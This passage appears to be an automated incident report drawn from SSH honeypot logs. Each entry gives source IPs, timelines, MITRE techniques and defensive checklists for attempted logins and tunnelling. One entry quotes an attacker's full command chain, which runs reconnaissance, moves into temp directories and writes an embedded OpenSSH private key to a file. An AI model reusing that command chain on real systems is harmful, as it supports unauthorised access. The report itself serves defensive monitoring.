| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 12:58:38` | `cowrie.session.connect` |
| `2026-09-03 12:58:38` | `cowrie.client.version` |
| `2026-09-03 12:58:39` | `cowrie.client.kex` |
| `2026-09-03 12:58:41` | `cowrie.login.success` |
| `2026-09-03 12:58:42` | `cowrie.session.params` |
| `2026-09-03 12:58:42` | `cowrie.command.input` |
| `2026-09-03 12:58:43` | `cowrie.log.closed` |
| `2026-09-03 12:58:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.39.190[.]137` to AbuseIPDB if not already reported
- [ ] Block `111.39.190[.]137` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd03543778e5

| Field | Detail |
|---|---|
| **Source IP** | `188.166.239[.]236` |
| **First Seen** | 2026-09-03 13:07 |
| **Last Seen** | 2026-09-03 13:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 13:07:07` | `cowrie.session.connect` |
| `2026-09-03 13:07:07` | `cowrie.client.version` |
| `2026-09-03 13:07:08` | `cowrie.client.kex` |
| `2026-09-03 13:07:08` | `cowrie.login.success` |
| `2026-09-03 13:07:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.166.239[.]236` to AbuseIPDB if not already reported
- [ ] Block `188.166.239[.]236` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-351be44001f3

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-09-03 13:07 |
| **Last Seen** | 2026-09-03 13:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e, 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 13:07:08` | `cowrie.session.connect` |
| `2026-09-03 13:07:08` | `cowrie.client.version` |
| `2026-09-03 13:07:09` | `cowrie.client.kex` |
| `2026-09-03 13:07:09` | `cowrie.login.success` |
| `2026-09-03 13:07:11` | `cowrie.session.params` |
| `2026-09-03 13:07:11` | `cowrie.command.input` |
| `2026-09-03 13:07:11` | `cowrie.session.file_download` |
| `2026-09-03 13:07:11` | `cowrie.session.file_download` |
| `2026-09-03 13:07:11` | `cowrie.log.closed` |
| `2026-09-03 13:07:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08dc4e371bfa

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 13:07 |
| **Last Seen** | 2026-09-03 13:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 13:07:22` | `cowrie.session.connect` |
| `2026-09-03 13:07:22` | `cowrie.client.version` |
| `2026-09-03 13:07:22` | `cowrie.client.kex` |
| `2026-09-03 13:07:25` | `cowrie.login.success` |
| `2026-09-03 13:07:25` | `cowrie.direct-tcpip.request` |
| `2026-09-03 13:07:25` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 13:07:25` | `cowrie.direct-tcpip.data` |
| `2026-09-03 13:07:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8e787766174

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 13:07 |
| **Last Seen** | 2026-09-03 13:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 13:07:54` | `cowrie.session.connect` |
| `2026-09-03 13:07:54` | `cowrie.client.version` |
| `2026-09-03 13:07:54` | `cowrie.client.kex` |
| `2026-09-03 13:07:55` | `cowrie.login.success` |
| `2026-09-03 13:07:55` | `cowrie.direct-tcpip.request` |
| `2026-09-03 13:07:55` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 13:07:55` | `cowrie.direct-tcpip.data` |
| `2026-09-03 13:07:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d2210c3fbc1

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 13:17 |
| **Last Seen** | 2026-09-03 13:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 13:17:19` | `cowrie.session.connect` |
| `2026-09-03 13:17:19` | `cowrie.client.version` |
| `2026-09-03 13:17:20` | `cowrie.client.kex` |
| `2026-09-03 13:17:20` | `cowrie.login.success` |
| `2026-09-03 13:17:21` | `cowrie.direct-tcpip.request` |
| `2026-09-03 13:17:21` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 13:17:21` | `cowrie.direct-tcpip.data` |
| `2026-09-03 13:17:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3fd4a6dda406

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 13:18 |
| **Last Seen** | 2026-09-03 13:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 13:18:01` | `cowrie.session.connect` |
| `2026-09-03 13:18:01` | `cowrie.client.version` |
| `2026-09-03 13:18:01` | `cowrie.client.kex` |
| `2026-09-03 13:18:02` | `cowrie.login.success` |
| `2026-09-03 13:18:02` | `cowrie.direct-tcpip.request` |
| `2026-09-03 13:18:02` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 13:18:02` | `cowrie.direct-tcpip.data` |
| `2026-09-03 13:18:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2626b5266a2

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-03 13:19 |
| **Last Seen** | 2026-09-03 13:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 13:19:27` | `cowrie.session.connect` |
| `2026-09-03 13:19:27` | `cowrie.client.version` |
| `2026-09-03 13:19:27` | `cowrie.client.kex` |
| `2026-09-03 13:19:27` | `cowrie.login.success` |
| `2026-09-03 13:19:27` | `cowrie.direct-tcpip.request` |
| `2026-09-03 13:19:28` | `cowrie.direct-tcpip.data` |
| `2026-09-03 13:19:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4cf5ab6e309c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 13:26 |
| **Last Seen** | 2026-09-03 13:26 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 13:26:55` | `cowrie.session.connect` |
| `2026-09-03 13:26:55` | `cowrie.client.version` |
| `2026-09-03 13:26:55` | `cowrie.client.kex` |
| `2026-09-03 13:26:56` | `cowrie.login.success` |
| `2026-09-03 13:26:57` | `cowrie.direct-tcpip.request` |
| `2026-09-03 13:26:57` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 13:26:57` | `cowrie.direct-tcpip.data` |
| `2026-09-03 13:26:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17005825438d

| Field | Detail |
|---|---|
| **Source IP** | `59.63.188[.]244` |
| **First Seen** | 2026-09-03 13:27 |
| **Last Seen** | 2026-09-03 13:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 13:27:14` | `cowrie.session.connect` |
| `2026-09-03 13:27:14` | `cowrie.client.version` |
| `2026-09-03 13:27:14` | `cowrie.client.kex` |
| `2026-09-03 13:27:15` | `cowrie.login.success` |
| `2026-09-03 13:27:16` | `cowrie.session.params` |
| `2026-09-03 13:27:16` | `cowrie.command.input` |
| `2026-09-03 13:27:16` | `cowrie.log.closed` |
| `2026-09-03 13:27:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.63.188[.]244` to AbuseIPDB if not already reported
- [ ] Block `59.63.188[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6dfd9d465ae

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 13:28 |
| **Last Seen** | 2026-09-03 13:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 13:28:48` | `cowrie.session.connect` |
| `2026-09-03 13:28:48` | `cowrie.client.version` |
| `2026-09-03 13:28:48` | `cowrie.client.kex` |
| `2026-09-03 13:28:49` | `cowrie.login.success` |
| `2026-09-03 13:28:49` | `cowrie.direct-tcpip.request` |
| `2026-09-03 13:28:50` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 13:28:50` | `cowrie.direct-tcpip.data` |
| `2026-09-03 13:28:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2307a3f97230

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 13:36 |
| **Last Seen** | 2026-09-03 13:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 13:36:28` | `cowrie.session.connect` |
| `2026-09-03 13:36:28` | `cowrie.client.version` |
| `2026-09-03 13:36:28` | `cowrie.client.kex` |
| `2026-09-03 13:36:29` | `cowrie.login.success` |
| `2026-09-03 13:36:29` | `cowrie.direct-tcpip.request` |
| `2026-09-03 13:36:30` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 13:36:30` | `cowrie.direct-tcpip.data` |
| `2026-09-03 13:36:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20dd39351ca5

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 13:39 |
| **Last Seen** | 2026-09-03 13:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 13:39:22` | `cowrie.session.connect` |
| `2026-09-03 13:39:22` | `cowrie.client.version` |
| `2026-09-03 13:39:22` | `cowrie.client.kex` |
| `2026-09-03 13:39:23` | `cowrie.login.success` |
| `2026-09-03 13:39:23` | `cowrie.direct-tcpip.request` |
| `2026-09-03 13:39:23` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 13:39:23` | `cowrie.direct-tcpip.data` |
| `2026-09-03 13:39:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad7606499807

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 13:45 |
| **Last Seen** | 2026-09-03 13:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 13:45:50` | `cowrie.session.connect` |
| `2026-09-03 13:45:50` | `cowrie.client.version` |
| `2026-09-03 13:45:50` | `cowrie.client.kex` |
| `2026-09-03 13:45:51` | `cowrie.login.success` |
| `2026-09-03 13:45:51` | `cowrie.direct-tcpip.request` |
| `2026-09-03 13:45:51` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 13:45:51` | `cowrie.direct-tcpip.data` |
| `2026-09-03 13:45:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff34078143a7

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 13:50 |
| **Last Seen** | 2026-09-03 13:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 13:50:16` | `cowrie.session.connect` |
| `2026-09-03 13:50:16` | `cowrie.client.version` |
| `2026-09-03 13:50:16` | `cowrie.client.kex` |
| `2026-09-03 13:50:17` | `cowrie.login.success` |
| `2026-09-03 13:50:17` | `cowrie.direct-tcpip.request` |
| `2026-09-03 13:50:17` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 13:50:17` | `cowrie.direct-tcpip.data` |
| `2026-09-03 13:50:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d49d9647bdd

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 13:55 |
| **Last Seen** | 2026-09-03 13:55 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 13:55:48` | `cowrie.session.connect` |
| `2026-09-03 13:55:48` | `cowrie.client.version` |
| `2026-09-03 13:55:49` | `cowrie.client.kex` |
| `2026-09-03 13:55:52` | `cowrie.login.success` |
| `2026-09-03 13:55:52` | `cowrie.direct-tcpip.request` |
| `2026-09-03 13:55:57` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 13:55:57` | `cowrie.direct-tcpip.data` |
| `2026-09-03 13:55:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93e6d1741d7a

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 14:01 |
| **Last Seen** | 2026-09-03 14:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 14:01:46` | `cowrie.session.connect` |
| `2026-09-03 14:01:46` | `cowrie.client.version` |
| `2026-09-03 14:01:46` | `cowrie.client.kex` |
| `2026-09-03 14:01:47` | `cowrie.login.success` |
| `2026-09-03 14:01:47` | `cowrie.direct-tcpip.request` |
| `2026-09-03 14:01:47` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 14:01:47` | `cowrie.direct-tcpip.data` |
| `2026-09-03 14:01:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3d12c41f6b1

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 14:05 |
| **Last Seen** | 2026-09-03 14:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 14:05:45` | `cowrie.session.connect` |
| `2026-09-03 14:05:45` | `cowrie.client.version` |
| `2026-09-03 14:05:45` | `cowrie.client.kex` |
| `2026-09-03 14:05:46` | `cowrie.login.success` |
| `2026-09-03 14:05:46` | `cowrie.direct-tcpip.request` |
| `2026-09-03 14:05:46` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 14:05:46` | `cowrie.direct-tcpip.data` |
| `2026-09-03 14:05:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d39975f394a

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 14:12 |
| **Last Seen** | 2026-09-03 14:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 14:12:20` | `cowrie.session.connect` |
| `2026-09-03 14:12:20` | `cowrie.client.version` |
| `2026-09-03 14:12:21` | `cowrie.client.kex` |
| `2026-09-03 14:12:22` | `cowrie.login.success` |
| `2026-09-03 14:12:22` | `cowrie.direct-tcpip.request` |
| `2026-09-03 14:12:22` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 14:12:22` | `cowrie.direct-tcpip.data` |
| `2026-09-03 14:12:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb22b4660170

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 14:15 |
| **Last Seen** | 2026-09-03 14:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 14:15:16` | `cowrie.session.connect` |
| `2026-09-03 14:15:16` | `cowrie.client.version` |
| `2026-09-03 14:15:16` | `cowrie.client.kex` |
| `2026-09-03 14:15:17` | `cowrie.login.success` |
| `2026-09-03 14:15:19` | `cowrie.direct-tcpip.request` |
| `2026-09-03 14:15:19` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 14:15:19` | `cowrie.direct-tcpip.data` |
| `2026-09-03 14:15:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91b82a15ba64

| Field | Detail |
|---|---|
| **Source IP** | `140.206.107[.]98` |
| **First Seen** | 2026-09-03 14:21 |
| **Last Seen** | 2026-09-03 14:26 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 14:21:40` | `cowrie.session.connect` |
| `2026-09-03 14:21:40` | `cowrie.client.version` |
| `2026-09-03 14:21:40` | `cowrie.client.kex` |
| `2026-09-03 14:21:42` | `cowrie.login.success` |
| `2026-09-03 14:26:42` | `cowrie.session.file_upload` |
| `2026-09-03 14:26:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.206.107[.]98` to AbuseIPDB if not already reported
- [ ] Block `140.206.107[.]98` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c22714c02db1

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 14:23 |
| **Last Seen** | 2026-09-03 14:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 14:23:34` | `cowrie.session.connect` |
| `2026-09-03 14:23:34` | `cowrie.client.version` |
| `2026-09-03 14:23:34` | `cowrie.client.kex` |
| `2026-09-03 14:23:35` | `cowrie.login.success` |
| `2026-09-03 14:23:35` | `cowrie.direct-tcpip.request` |
| `2026-09-03 14:23:36` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 14:23:36` | `cowrie.direct-tcpip.data` |
| `2026-09-03 14:23:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2350f43798b2

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 14:25 |
| **Last Seen** | 2026-09-03 14:25 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 14:25:08` | `cowrie.session.connect` |
| `2026-09-03 14:25:08` | `cowrie.client.version` |
| `2026-09-03 14:25:09` | `cowrie.client.kex` |
| `2026-09-03 14:25:12` | `cowrie.login.success` |
| `2026-09-03 14:25:12` | `cowrie.direct-tcpip.request` |
| `2026-09-03 14:25:13` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 14:25:13` | `cowrie.direct-tcpip.data` |
| `2026-09-03 14:25:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
